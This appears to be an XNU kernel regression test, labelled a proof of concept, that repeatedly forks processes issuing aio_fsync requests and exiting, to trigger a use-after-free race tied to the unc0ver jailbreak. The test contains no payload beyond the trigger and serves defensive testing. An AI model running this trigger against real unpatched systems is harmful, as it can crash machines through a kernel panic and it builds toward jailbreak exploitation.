/*
 * Proof of Concept / Test Case
 * XNU: aio_work_thread use-after-free for AIO_FSYNC entries
 */
#include <err.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>

#include <sys/aio.h>
#include <unistd.h>
#include <darwintest.h>
#include <time.h>

T_GLOBAL_META(
	T_META_NAMESPACE("xnu.vfs"),
	T_META_RUN_CONCURRENTLY(true));

#define NREQUESTS 8

static void
attempt(int fd)
{
	struct aiocb ap[NREQUESTS];
	size_t n;
	unsigned char c;

	for (n = 0; n < NREQUESTS; ++n) {
		ap[n].aio_fildes = fd;
		ap[n].aio_nbytes = 1;
		ap[n].aio_buf = &c;
		ap[n].aio_sigevent.sigev_notify = SIGEV_NONE;
	}

	/*
	 * fire them off and exit.
	 */
	for (n = 0; n < NREQUESTS; ++n) {
		aio_fsync((n & 1) ? O_SYNC : O_DSYNC, &ap[n]);
	}

	exit(0);
}

T_DECL(lio_listio_race_63669270, "test for the lightspeed/unc0ver UaF")
{
	pid_t child;
	int fd;
	char path[128];
	uint64_t end = clock_gettime_nsec_np(CLOCK_UPTIME_RAW) + 10 * NSEC_PER_SEC;

	/* we need a valid fd: */
	strcpy(path, "/tmp/aio_fsync_uaf.XXXXXX");
	T_EXPECT_POSIX_SUCCESS(fd = mkstemp(path), "mkstemp");
	T_EXPECT_POSIX_SUCCESS(unlink(path), "unlink");

	T_LOG("starting...");
	do {
		switch ((child = fork())) {
		case -1: T_FAIL("fork");
		case 0: attempt(fd);
		}

		T_QUIET; T_EXPECT_POSIX_SUCCESS(waitpid(child, NULL, 0), "waitpid");
	} while (clock_gettime_nsec_np(CLOCK_UPTIME_RAW) < end);

	T_PASS("the system didn't panic");
}
